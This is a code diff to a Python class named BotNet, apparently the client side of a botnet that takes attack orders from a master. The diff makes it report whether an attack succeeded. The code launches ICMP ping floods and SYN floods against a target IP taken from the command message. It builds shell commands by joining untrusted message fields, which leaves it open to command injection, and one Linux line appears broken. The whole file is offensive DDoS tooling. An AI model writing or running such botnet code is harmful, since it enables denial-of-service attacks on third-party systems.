@@ -62,6 +62,7 @@ class BotNet:
         return platform.system()
 
     def attackTarget(self, message):
+        response = 0
         if (self.get_platform().lower() == "linux"):
             if message["attack_type"] == "icmp":
                 os.system("ping "+message["target_ip"] + " -s 65500")
@@ -70,14 +71,20 @@ class BotNet:
                           message["target_ip"] + 80 + str(message["number_of_attack"]))
         elif (self.get_platform().lower() == "windows"):
             if message["attack_type"] == "icmp":
-                os.system("ping "+message["target_ip"] +
-                          " -l 65500 -n " + str(message["number_of_attack"]))
+                response = os.system("ping "+message["target_ip"] +
+                                     " -l 65500 -n " + str(message["number_of_attack"]))
             elif message["attack_type"] == "syn":
                 os.system("python syn_attack.py " +
                           message["target_ip"] + " " + str(80) + " " + str(message["number_of_attack"]))
         self.isAttack == False
+
+        if response == 0:
+            response = "success"
+        else:
+            response = "failed"
+
         self.informMaster(message["target_ip"],
-                          "success", message["attack_type"])
+                          response, message["attack_type"])
 
     def informMaster(self, target, status, attack_type):
         self.client.inform_master(getIpAddress(), target, status, attack_type)
